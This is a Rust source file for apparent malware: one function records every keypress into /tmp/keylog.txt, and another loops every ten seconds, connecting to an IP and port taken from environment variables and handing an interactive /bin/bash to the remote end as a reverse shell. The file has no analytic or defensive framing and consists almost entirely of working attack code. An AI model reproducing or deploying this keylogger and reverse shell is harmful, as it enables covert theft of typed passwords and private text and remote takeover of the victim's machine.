use std::fs::OpenOptions;
use std::io::Write;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use device_query::{ Keycode };
use dotenv::dotenv;
use std::{ env };
use std::{thread, time};



pub fn match_case(key: &Keycode) -> &'static str {

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("/tmp/keylog.txt")
        .expect("Failed to open file");


    // using match expression
    match *key {
        Keycode::Space => {
            // write to file
            file.write(b" ").expect("Failed to write to file");
            "Space"
        }
        Keycode::Enter => {
            // write to file
            file.write(b"\n").expect("Failed to write to file");
            "Enter"
        }
        Keycode::RShift | Keycode::Slash => {
            // write to file
            file.write(b"?").expect("Failed to write to file");
            "?"
        } 
        _ => { 
            write!(file, "{}",  key).expect("Failed to write to file");  
            "Other"
        }
    }    
}

pub fn reverse_shell() {
    dotenv().ok();
    
    // read key and value from file
    let key = env::var("IP").unwrap();
    let value = env::var("PORT").unwrap();
    let addr = format!("{}:{}", key, value);

    loop {
        thread::sleep(time::Duration::from_millis(10000));   

        match TcpStream::connect(addr.clone()) {
            Ok(stream) => {
                // println!("Connected to {}", addr);
                let fd = stream.as_raw_fd();

                Command::new("/bin/bash")
            .       arg("-i")
            .       stdin(unsafe { Stdio::from_raw_fd(fd) })
            .       stdout(unsafe { Stdio::from_raw_fd(fd) })
            .       stderr(unsafe { Stdio::from_raw_fd(fd) })
            .       spawn()
            .       unwrap()
            .       wait()
            .       unwrap();
            }
            Err(_e) => {
                // println!("Failed to connect to {}: {}", addr, e);
            }
        }
    }    
}


// --------------------- UNIT TESTS --------------------- //
#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        assert_eq!(2 + 2, 4);
    }
}